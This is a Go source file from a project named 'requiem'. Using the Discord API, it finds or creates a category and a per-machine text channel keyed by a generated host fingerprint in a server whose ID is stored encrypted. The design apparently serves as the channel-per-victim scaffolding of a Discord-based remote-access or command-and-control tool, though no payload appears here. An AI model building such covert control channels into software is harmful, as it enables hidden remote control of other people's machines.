package discord

import (
	"strings"

	"requiem/funcs"
	"requiem/store"

	"github.com/bwmarrin/discordgo"
)

const DEFAULT_CATEGORY_NAME string = "string2"

func FindCategory(ses *discordgo.Session) (string, error) {
	channels, err := ses.GuildChannels(store.DecryptedServerID)
	if err != nil {
		return "", err
	}

	for _, channel := range channels {
		if channel.Type != discordgo.ChannelTypeGuildCategory {
			continue
		}

		if strings.ToLower(channel.Name) != DEFAULT_CATEGORY_NAME {
			continue
		}

		return channel.ID, nil
	}

	channel, err := ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
		Name: DEFAULT_CATEGORY_NAME,
		Type: discordgo.ChannelTypeGuildCategory,
	})

	if err != nil {
		return "", err
	}

	return channel.ID, nil
}

// the 2nd return is if the channel was newly created
func FindChannel(ses *discordgo.Session, categoryID string) (string, bool, error) {
	channels, err := ses.GuildChannels(store.DecryptedServerID)
	if err != nil {
		return "", false, err
	}

	fingerprint, err := funcs.GenFingerprint()
	if err != nil {
		return "", false, err
	}

	for _, channel := range channels {
		if channel.Topic != fingerprint {
			continue
		}

		if channel.Type != discordgo.ChannelTypeGuildText {
			continue
		}

		if channel.ParentID != categoryID {
			continue
		}

		return channel.ID, false, nil
	}

	channel, err := ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
		Name:     fingerprint,
		Topic:    fingerprint,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})

	if err != nil {
		return "", false, err
	}

	return channel.ID, true, nil
}
